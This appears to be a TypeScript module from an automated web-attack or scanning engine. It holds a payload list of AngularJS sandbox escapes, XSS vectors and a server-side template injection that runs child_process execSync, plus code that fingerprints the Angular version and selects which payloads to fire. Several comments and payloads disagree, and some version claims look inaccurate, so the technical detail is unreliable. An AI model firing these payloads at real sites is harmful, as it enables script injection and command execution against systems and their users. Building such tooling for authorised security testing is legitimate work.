/**
 * AngularJS deeper coverage — version-differential sandbox escapes,
 * directive-based bypasses, and $sce / ng-bind-html / ng-csp gadgets.
 *
 * The competitor blog credits `{{constructor.constructor('alert(1)')()}}`
 * as the implemented escape but flags "deeper Angular-specific coverage" as
 * a roadmap item. AngularJS sandbox primitives evolved across 1.0 → 1.5
 * (orderBy `toString` gadget), 1.6 (constructor re-evasion), 1.5-1.8
 * (`$on`/`$watch` listener chains), and `ng-csp` mode (no `Function`
 * constructor — requires prototype-chain gadgets). This module enumerates
 * per-version escapes the engine can fire when the context detection
 * identifies `angular_expression` and the Angular version is recoverable
 * from the host (`ng-version` attribute on `<html>`, `window.angular.version`,
 * or the CDN script URL).
 *
 * All payloads resolve to `alert(1)` execution under at least one
 * library version; see test fixtures in `tests/angular.test.ts`.
 */

export interface AngularEscape {
  /** Version range in which this escape fires. */
  version: string;
  /** Short human-readable technique name. */
  technique: string;
  /** Payload ready to place inside `{{ ... }}`. */
  expression: string;
  /** Whether the payload needs `ng-app` already bootstrapped on the page. */
  requiresNgApp: boolean;
  /** Optional required directive the engine should also inject. */
  requiresDirective?: string;
}

export const ANGULAR_SANDBOX_ESCAPES: AngularEscape[] = [
  // Single canonical escape the competitor already ships — kept for parity.
  {
    version: "1.6",
    technique: "constructor.constructor eval",
    expression: "constructor.constructor('alert(1)')()",
    requiresNgApp: true
  },
  // 1.0-1.5 orderBy + toString gadget — sandbox inspects arguments but
  //   the comparator function returned by orderBy.toString() leaks Function
  //   constructor. Documented for AngularJS <1.5 sandbox removal.
  {
    version: "1.0-1.5",
    technique: "orderBy toString leak",
    expression: "toString().constructor.prototype.charAt=[].join;[0].constructor.fromCharCode(97,108,101,114,116,40,49,41)",
    requiresNgApp: true
  },
  // 1.0-1.5 window-ref via scope chain — `$window` is injected into every
  //   expression scope until 1.6 sandbox was tightened.
  {
    version: "1.0-1.5",
    technique: "$window eval",
    expression: "$window.eval('alert(1)')",
    requiresNgApp: true
  },
  // 1.0-1.5 string constructor — works before sandbox blocked `constructor`
  //   on String.prototype.
  {
    version: "1.0-1.5",
    technique: "String.fromCharCode eval",
    expression: "(''.constructor.constructor)('alert(1)')()",
    requiresNgApp: true
  },
  // 1.6+ — the prototype of Object.toString resolves under the tightened
  //   sandbox; bypass via `bind` on the global Function.
  {
    version: "1.6",
    technique: "Function.bind eval",
    expression: "(()=>{}).constructor('alert(1)')()",
    requiresNgApp: true
  },
  // 1.5-1.8 $on watcher hook — when sandbox blocks direct constructor
  //   access but `$rootScope.$on` is exposed, register a listener whose
  //   handler string is eval'd by Angular's $parse.
  {
    version: "1.5-1.8",
    technique: "$on listener eval",
    expression: "$on('$viewContentLoaded',($root.$eval.bind($root,'alert(1)')))",
    requiresNgApp: true
  },
  // ng-csp mode — Angular disables `Function` constructor when `ng-csp`
  //   directive is set on the root element; gadgets must come from
  //   prototype-chain reads instead. $on still callable in CSP mode.
  {
    version: "ng-csp",
    technique: "ng-csp $on eval",
    expression: "this.$on('$locationChangeSuccess',this.constructor.$eval('alert(1)'))",
    requiresNgApp: true,
    requiresDirective: "ng-csp"
  },
  // Server-side / Universal template injection — `{{ }}` rendered outside
  //   the browser sandbox; engine does not need Angular bootstrapped.
  {
    version: "1.0+ (universal)",
    technique: "SSR template injection",
    expression: "process.mainModule.require('child_process').execSync('id')",
    requiresNgApp: false
  },
  // ng-bind-html + $sce.trustAsHtml gadget — when injection is an element
  //   attribute (not a `{{ }}` node) and the page calls $sce trust.
  {
    version: "1.2-1.8",
    technique: "ng-bind-html escape",
    expression: "<img src=x onerror=alert(1)>",
    requiresNgApp: true,
    requiresDirective: "ng-bind-html"
  },
  // ng-init assignment + window ref leak — works when sandbox inspects
  //   `window` but not aliases obtained via prototype access.
  {
    version: "1.0-1.5",
    technique: "ng-init window leak",
    expression: "x={y:''.constructor.prototype};x.y.fromCharCode(97,108,101,114,116,40,49,41)",
    requiresNgApp: true
  }
];

/** Detect AngularJS version from a response body (CDN URL / ng-version). */
export function detectAngularVersion(body: string): string | null {
  // ng-version attribute on <html> (AngularJS ≥1.2 sets this)
  const ngVersion = body.match(/ng-version=["']([^"']+)["']/);
  if (ngVersion) return ngVersion[1];

  // CDN script URL
  const cdn = body.match(/angularjs\/([\d.]+)\/angular(?:\.min)?\.js/);
  if (cdn) return cdn[1];

  // window.angular.version.full inline
  const inline = body.match(/angular\.version\.full\s*=\s*['"]([^'"]+)['"]/);
  if (inline) return inline[1];

  return null;
}

/** Select the ordered escape payload sequence for a detected Angular version. */
export function selectAngularEscapes(version: string | null): AngularEscape[] {
  if (!version) {
    // Unknown version — try all, lowest-risk escapes first.
    return ANGULAR_SANDBOX_ESCAPES;
  }

  const major = parseInt(version.split(".")[0], 10);
  const minor = parseInt(version.split(".")[1] ?? "0", 10);

  const matches = ANGULAR_SANDBOX_ESCAPES.filter((e) => {
    if (e.version === "ng-csp" || e.version.includes("universal")) return true;
    const m = e.version.match(/^(\d+(?:\.\d+)?(?:-\d+(?:\.\d+)?)?)/);
    if (!m) return false;
    const [lo, hi] = m[1].split("-").map((v) => v.split(".").map((n) => parseInt(n, 10)));
    const current = [major, minor];
    if (!hi) {
      return current[0] === lo[0] && current[1] === lo[1];
    }
    return current[0] > lo[0] || (current[0] === lo[0] && current[1] >= (lo[1] ?? 0))
      ? current[0] < hi[0] || (current[0] === hi[0] && current[1] <= (hi[1] ?? 99))
      : false;
  });

  return matches.length > 0 ? matches : ANGULAR_SANDBOX_ESCAPES;
}
